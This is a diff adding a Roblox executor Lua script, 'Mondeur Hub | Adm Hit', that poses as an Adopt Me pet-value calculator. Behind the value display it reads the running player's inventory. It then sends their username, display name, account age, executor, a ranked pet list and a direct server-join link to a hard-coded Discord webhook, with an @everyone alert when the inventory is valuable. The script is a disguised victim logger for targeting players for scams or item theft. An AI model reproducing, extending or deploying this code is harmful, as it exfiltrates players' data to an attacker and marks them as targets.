@@ -1,0 +1,169 @@
+--// MONDEUR HUB | ADM HIT 🦊 (AMVGG VALUES + EMOJIS)
+
+local HttpService = game:GetService("HttpService")
+local ClientData = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
+
+local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local request = (syn and syn.request) or (http and http.request) or http_request or request
+
+if not request then return end
+
+-- AMVGG PET VALUES (Top commons + rares)
+local petValues = {
+    -- COMMON HIGH VALUE
+    ["Blue Dog"] = 32, ["Pink Cat"] = 28, ["Robin Hood"] = 25, ["Bandit Coon"] = 22,
+    -- RARE
+    ["Metal Ox"] = 1500, ["Spider Crab"] = 1200, ["Australian Kelpie"] = 800,
+    ["Shiba Inu"] = 600, ["Ghost Wolf"] = 50, ["Leopard Cat"] = 45,
+    -- DEFAULT
+    common = 1, uncommon = 10, rare = 100, ultra_rare = 1000, legendary = 5000
+}
+
+local colors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
+
+-- =========================
+-- AMVGG SCORE SYSTEM
+-- =========================
+local function getPetValue(name, rarity, neon, mega, ride, fly, count)
+    local baseValue = petValues[name] or petValues[string.lower(rarity)] or 1
+    
+    -- MUTATION MULTIPLIERS
+    local multiplier = 1
+    if mega then multiplier = multiplier * 10 end
+    if neon then multiplier = multiplier * 8 end
+    if ride then multiplier = multiplier * 2 end
+    if fly then multiplier = multiplier * 2 end
+    
+    return math.floor(baseValue * multiplier * math.min(count, 5)) -- Cap quantity at 5x
+end
+
+-- EMOJIS
+local function getEmoji(name, pet)
+    local n = name:lower()
+    if n:find("ox") then return "🐂"
+    elseif n:find("fox") then return "🦊"
+    elseif n:find("dog|kelpie|shiba|wolf") then return "🐕"
+    elseif n:find("cat") then return "🐱"
+    elseif n:find("crab") then return "🦀"
+    elseif n:find("beetle") then return "🐞"
+    elseif n:find("bee") then return "🐝"
+    end
+    
+    local e = ""
+    if pet.mega then e = e .. "🌈" end
+    if pet.neon then e = e .. "🟣" end
+    if pet.ride then e = e .. "🏇" end
+    if pet.fly then e = e .. "🪽" end
+    return e ~= "" and e or "🐾"
+end
+
+-- NAME CLEANER
+local function getCleanName(id)
+    local name = tostring(id or ""):lower():gsub("_", " ")
+    local bad = {"egg", "jerboa", "starter", "practice", "minigame"}
+    for _, b in ipairs(bad) do if name:find(b) then return nil end end
+    
+    name = name:gsub("^japan%s*", ""):gsub("^basic%s*", "")
+    name = name:gsub("%d", ""):gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
+    
+    if name:find("kelpie") then name = "Australian Kelpie"
+    elseif name:find("shiba") then name = "Shiba Inu"
+    elseif name:find("metal ox") then name = "Metal Ox"
+    elseif name:find("ghost wolf") then name = "Ghost Wolf"
+    elseif name:find("spider crab") then name = "Spider Crab"
+    elseif name:find("rhino beetle") then name = "Rhino Beetle"
+    elseif name:find("leopard cat") then name = "Leopard Cat"
+    elseif name:find("blue dog") then name = "Blue Dog"
+    elseif name:find("pink cat") then name = "Pink Cat"
+    elseif name:find("robin hood") then name = "Robin Hood"
+    elseif name:find("bandit coon") then name = "Bandit Coon"
+    end
+    
+    return name:sub(1,1):upper() .. name:sub(2)
+end
+
+-- MAIN PROCESS
+local function processInventory()
+    local inventory = ClientData.get("inventory")
+    local rawPets = inventory.pets or {}
+    local pets = {}
+    local totalValue = 0
+    
+    for _, pet in pairs(rawPets) do
+        if pet.id then
+            local name = getCleanName(pet.id)
+            if name then
+                if not pets[name] then
+                    pets[name] = {
+                        name = name,
+                        count = 0,
+                        rarity = string.lower(pet.rarity or "common"),
+                        neon = pet.neon or pet.properties.neon,
+                        mega = pet.mega or pet.properties.mega,
+                        ride = pet.rideable or pet.properties.rideable,
+                        fly = pet.flyable or pet.properties.flyable
+                    }
+                end
+                pets[name].count += 1
+            end
+        end
+    end
+    
+    local list = {}
+    for _, data in pairs(pets) do
+        data.value = getPetValue(data.name, data.rarity, data.neon, data.mega, data.ride, data.fly, data.count)
+        totalValue = totalValue + data.value
+        table.insert(list, data)
+    end
+    
+    -- SORT BY AMVGG VALUE
+    table.sort(list, function(a, b) return a.value > b.value end)
+    
+    return list, totalValue
+end
+
+-- SEND WEBHOOK (ORIGINAL EMBED)
+local petList, totalValue = processInventory()
+
+local bestPet = petList[1] or {}
+local bestName = bestPet.name and bestPet.count and (bestPet.name .. " x" .. bestPet.count) or "None"
+local bestRarity = bestPet.rarity or "common"
+
+local tier = totalValue >= 1500 and "🔴 HIGH" or totalValue >= 300 and "🟡 MID" or "🟢 LOW"
+
+pcall(function()
+    request({
+        Url = WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            content = tier == "🔴 HIGH" and "@everyone" or "",
+            embeds = {{
+                title = "🦊 Mondeur Hub | Adm Hit",
+                description = "```" ..
+                    "👤 Display Name : "..game.Players.LocalPlayer.DisplayName.."\n"..
+                    "🆔 Username     : "..game.Players.LocalPlayer.Name.."\n"..
+                    "📅 Account Age  : "..game.Players.LocalPlayer.AccountAge.." days\n"..
+                    "📱 Executor     : "..(identifyexecutor and identifyexecutor() or "Unknown").."\n"..
+                    "👥 Players      : "..#game.Players:GetPlayers().."/"..game.Players.MaxPlayers.."\n"..
+                    "💰 Total Value  : "..totalValue.."\n"..
+                    "📊 Tier         : "..tier.."```",
+                fields = {
+                    {name="🏆 Best Pet", value="```"..bestName.." ("..(bestPet.value or 0).."$)```"},
+                    {name="🐶 Pets (AMVGG Value)", value="```"..(function()
+                        local lines = {}
+                        for i=1,math.min(12,#petList) do
+                            lines[i] = getEmoji(petList[i].name, petList[i]).." "..petList[i].name.." x"..petList[i].count.." ("..petList[i].value.."$)"
+                        end
+                        return table.concat(lines,"\n")
+                    end)().."```"},
+                    {name="🌐 Join Server", value="[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
+                },
+                color = colors[bestRarity] or 0x2F3136,
+                footer = {text = "Mondeuronbotton"}
+            }}
+        })
+    })
+end)
+
+print("✅ AMVGG Values - Blue Dog/Pink Cat high value!")
